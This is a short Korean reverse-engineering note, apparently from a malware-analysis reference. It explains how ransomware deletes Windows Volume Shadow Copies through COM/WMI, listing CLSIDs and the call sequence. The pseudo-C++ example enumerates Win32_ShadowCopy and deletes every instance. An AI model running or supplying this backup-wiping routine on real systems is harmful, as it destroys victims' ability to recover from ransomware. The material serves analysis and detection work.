#com
### Concept

볼륨 쉐도우 카피(Volume Shadow Copy, VSC)는 Microsoft Windows 운영 체제에서 사용자 및 시스템 파일의 이전 버전을 자동으로 백업하고 관리하는 기능

랜섬 웨어는 볼륨 쉐도우 카피를 삭제하여 사용자가 시스템을 복원하지 못하게 함.

### Code Flow

1. CoInitialize를 호출해 COM 라이브러리를 초기화
2. CoCreateInstance API를 호출하여 WbemAdministrativeLocator 클래스를 사용해 객체를 생성하고 IWbemClass 인터페이스를 획득.
	- `CLSID_WbemAdministrativeLocator = {cb8555cc-9128-11d1-ad9b-00c04fd8fdff}`
	- `IID_IWbemClass = {dc12a687-737f-11cf-884d-00aa004b2e24}`
3. CoCreateInstance API를 호출하여 Microsoft WBEM Call ContextPermalink 클래스를 사용해 객체를 생성하고 IWbemContext 인터페이스를 획득.
	- `CLSID_Microsoft_WBEM_Call_ContextPermalink = {674b6698-ee92-11d0-ad71-00c04fd8fdff}`
	- `IID_IWbemContext = {44aca674-e8fc-11d0-a07c-00c04fb68820}`
4. 만약 64bit라면 IWbemContext::SetValue 매서드를 사용하여 `__ProviderArchitecture`를 설정
5. IWbemLocator::ConnectServer 매서드를 사용하여 "ROOT\\CIMV2"에 연결하고 IWbemServices 인터페이스를 획득
6. CoSetProxyBlanket API를 사용하여 획득한 IWebServices 인터페이스에서 사용할 인증 정보를 설정
7. IWbemServices::ExecQuery 매서드와 WQL을 사용하여 "Win32 ShadowCopy" 객체를 조회하고 IWbemClassObject 인터페이스를 획득
8. IEnumWbemClassObject::Next를 사용해 객체들을 순회
9. IWbemClassObject::Get를 사용해 ID를 획득
10. IWbemServices::DeleteInstance를 사용해 VSC를 삭제
11. 각 객체를 release하고 CoUninitialize API를 호출해 COM 라이브러리를 종료

### Example

```c++
CoInitialize(0x0);
CoCreateInstance(&clsid_WbemAdministrativeLocator, NULL, CLSCTX_INPROC_SERVER,
				 &iid_IWbemLocator, &p_IWbemClass);
CoCreateInstance(&clsid_Microsoft_WBEM_Call_ContextPermalink,
				 NULL, CLSCTX_INPROC_SERVER, &iid_IWbemContext, &p_IWbemContext);
if (Is64bit()) {
	p_IWbemContext->SetValue("__ProviderArchitecture", 0x0, "64");
}
p_IWbemLocator->ConnectServer("ROOT\CIMV2", 0x0, 0x0, 0x0, 0x0, 0x0,
							  p_IWbemContext, &p_IWbemServices);
CoSetProxyBlanket(p_IWbemServices, RPC_C_AUTHN_WINNT, 0x0, NULL, RPC_C_AUTHN_LEVEL_CALL,
				  RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0x0);
p_IWbemServices->ExecQuery("WQL", "SELECT * FROM Win32_ShadowCopy", 0x30, 0x0,
                           &p_IEnumWbemClassObject);
while(true) {
    p_IWbemClassObject = NULL;
	returned = 0;
    ret = IEnumWbemClassObject->Next(WBEM_INFINITE, 0x1, &p_IWbemClassObject, &returned);
    if (ret != 0x0) break;
    p_IWbemClassObject->Get("ID", 0x0, val, 0x0, 0x0);
	p_IWbemServices->DeleteInstance("Win32_ShadowCopy.ID='(val)'", 0x0, 0x0, 0x0);
    p_IWbemClassObject->Release();
}
p_IEnumWbemClassObject->Release();
p_IWbemServices->Release();
p_IWbemContext->Release();
p_IWbemLocator->Release();
CoUninitialize();
```